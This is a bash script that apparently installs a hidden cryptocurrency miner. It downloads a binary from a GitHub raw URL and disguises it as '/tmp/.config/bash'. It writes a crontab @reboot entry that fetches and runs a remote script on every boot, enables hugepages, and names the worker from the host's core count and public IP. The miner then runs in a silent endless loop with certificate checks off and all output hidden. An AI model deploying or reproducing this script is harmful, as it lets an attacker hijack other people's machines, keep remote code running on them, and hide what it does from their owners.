#!/bin/bash

src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"

# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"
name="c${cores}_${addr}"

sudo sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1
sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1

mkdir -p "/tmp/.config"
wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.json"
wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
chmod -R 777 "/tmp/.config"

bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &

